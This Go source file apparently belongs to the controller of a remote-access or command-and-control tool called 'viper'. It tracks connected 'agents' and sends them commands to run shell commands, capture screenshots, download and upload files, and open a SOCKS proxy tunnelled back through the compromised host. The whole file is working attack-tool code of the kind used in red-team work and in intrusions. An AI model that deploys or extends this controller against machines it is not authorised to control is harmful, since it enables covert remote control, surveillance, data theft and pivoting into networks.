package agents

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"time"

	"github.com/hashicorp/yamux"
	"google.golang.org/protobuf/proto"

	pb "viper/protos/cmds"
)

type SocksServer struct {
	session   *yamux.Session
	agentConn net.Conn
	proxyAddr net.Addr
}

type Agent struct {
	Id          int64
	alive       bool
	conn        net.Conn
	ConnectTime time.Time
	socks       *SocksServer
}

const (
	ERR_AGENT_DISCONNECTED = "Agent (%d) has disconnected."
	ERR_AGENT_NOT_FOUND    = "Agent not found."
)

var (
	Agents = make(map[int64]*Agent)
)

func GetAgent(id int64) (*Agent, error) {
	agent := Agents[id]
	if agent == nil {
		return nil, errors.New(ERR_AGENT_NOT_FOUND)
	}
	if !agent.alive {
		return nil, fmt.Errorf(ERR_AGENT_DISCONNECTED, id)
	}
	return agent, nil
}

func InitAgent(conn net.Conn) {
	log.Printf("Received connection @ %v", conn.RemoteAddr())
	agentId := int64(len(Agents))
	agent := &Agent{conn: conn, alive: true, Id: agentId, ConnectTime: time.Now()}
	validAgent := agent.IsAlive()
	if !validAgent {
		log.Print("Connection is not an agent.")
		conn.Close()
		return
	}
	log.Printf("[%d] Initializing agent.", agentId)
	Agents[agentId] = agent
}

func (agent *Agent) IsAlive() bool {
	if !agent.alive {
		return false
	}
	_, err := agent.RunEchoCommand(&pb.EchoCommandRequest{Data: "ping"})
	return err == nil
}

func (agent *Agent) Screenshot(req *pb.ScreenshotRequest) (*pb.ScreenshotResponse, error) {
	cmdReq := &pb.CommandRequest{Type: pb.SCREENSHOT_CMD_TYPE, Req: &pb.CommandRequest_ScreenshotRequest{ScreenshotRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.ScreenshotResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, errors.New(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) RunEchoCommand(req *pb.EchoCommandRequest) (*pb.EchoCommandResponse, error) {
	cmdReq := &pb.CommandRequest{Type: pb.ECHO_CMD_TYPE, Req: &pb.CommandRequest_EchoCommandRequest{EchoCommandRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.EchoCommandResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func (agent *Agent) RunShellCommand(req *pb.ShellCommandRequest) (*pb.ShellCommandResponse, error) {
	cmdReq := &pb.CommandRequest{Type: pb.SHELL_CMD_TYPE, Req: &pb.CommandRequest_ShellCommandRequest{ShellCommandRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.ShellCommandResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, errors.New(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) DownloadFile(req *pb.DownloadFileRequest) (*pb.DownloadFileResponse, error) {
	cmdReq := &pb.CommandRequest{Type: pb.DOWNLOAD_FILE_CMD_TYPE, Req: &pb.CommandRequest_DownloadFileRequest{DownloadFileRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.DownloadFileResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, errors.New(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) UploadFile(req *pb.UploadFileRequest) (*pb.UploadFileResponse, error) {
	cmdReq := &pb.CommandRequest{Type: pb.UPLOAD_FILE_CMD_TYPE, Req: &pb.CommandRequest_UploadFileRequest{UploadFileRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.UploadFileResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, errors.New(resp.Err)
	}
	return resp, nil
}

func (agent *Agent) StartSocksServer(req *pb.StartSocksServerRequest) (*pb.StartSocksServerResponse, error) {
	if agent.socks != nil {
		return nil, fmt.Errorf("[%d] SOCKS server already running at %v.", agent.Id, agent.socks.proxyAddr)
	}
	cmdReq := &pb.CommandRequest{Type: pb.START_SOCKS_CMD_TYPE, Req: &pb.CommandRequest_StartSocksServerRequest{StartSocksServerRequest: req}}
	err := agent.write(cmdReq)
	if err != nil {
		return nil, err
	}
	resp := &pb.StartSocksServerResponse{}
	err = agent.read(resp)
	if err != nil {
		return nil, err
	}
	if resp.Err != "" {
		return nil, errors.New(resp.Err)
	}
	socksSession, err := yamux.Client(agent.conn, nil)
	if err != nil {
		return nil, err
	}
	log.Printf("[%d] Connected to the SOCKS server.", agent.Id)
	controllerSocksListener, err := net.Listen("tcp", "127.0.0.1:")
	if err != nil {
		socksSession.Close()
		return nil, err
	}
	resp.Addr = controllerSocksListener.Addr().String()
	log.Printf("[%d] SOCKS proxy server @ %s", agent.Id, resp.Addr)
	agent.socks = &SocksServer{session: socksSession, proxyAddr: controllerSocksListener.Addr()}
	go func() {
		for {
			agentConn, err := socksSession.Open()
			if err != nil {
				log.Printf("Failed to open a SOCKS session.")
				socksSession.Close()
			}
			controllerConn, err := controllerSocksListener.Accept()
			if err != nil {
				log.Printf("[%d] Failed to accept new SOCKS proxy connection.", agent.Id)
				socksSession.Close()
			}
			go proxyConns(controllerConn, agentConn)
			go proxyConns(agentConn, controllerConn)
		}
	}()
	return resp, nil
}

func proxyConns(conn1, conn2 net.Conn) {
	_, err := io.Copy(conn1, conn2)
	if err != nil {
		log.Printf("Failed to proxy connections: %v", err)
		return
	}
	conn1.Close()
	conn2.Close()
}

func (agent *Agent) read(resp proto.Message) error {
	var respSize int64
	err := binary.Read(agent.conn, binary.LittleEndian, &respSize)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	respBuffer := make([]byte, respSize)
	_, err = io.ReadFull(agent.conn, respBuffer)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	err = proto.Unmarshal(respBuffer, resp)
	if err != nil {
		return err
	}
	return nil
}

func (agent *Agent) write(cmdReq *pb.CommandRequest) error {
	cmdBuffer, err := proto.Marshal(cmdReq)
	if err != nil {
		return err
	}
	cmdBufferLen := int64(len(cmdBuffer))
	err = binary.Write(agent.conn, binary.LittleEndian, &cmdBufferLen)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	_, err = agent.conn.Write(cmdBuffer)
	if err == io.EOF || err == io.ErrUnexpectedEOF {
		agent.Close()
		return fmt.Errorf(ERR_AGENT_DISCONNECTED, agent.Id)
	}
	if err != nil {
		return err
	}
	return nil
}

func (agent *Agent) Close() {
	if !agent.alive {
		log.Printf("[%d] Agent already closed.", agent.Id)
		return
	}
	log.Printf("[%d] Agent has disconnected.", agent.Id)
	agent.conn.Close()
	agent.alive = false
}
